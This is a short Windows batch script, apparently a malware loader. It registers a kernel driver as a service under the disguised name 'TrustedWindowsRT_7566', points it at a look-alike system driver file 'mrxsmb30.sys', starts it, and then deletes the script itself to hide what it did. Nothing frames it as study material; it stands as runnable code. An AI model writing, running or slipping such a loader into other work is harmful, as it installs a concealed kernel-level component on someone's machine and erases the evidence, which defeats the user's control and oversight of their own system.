@echo off
cd %~dp0
sc create TrustedWindowsRT_7566 binpath=C:\Windows\System32\drivers\mrxsmb30.sys type=kernel
sc start TrustedWindowsRT_7566
del "%~f0"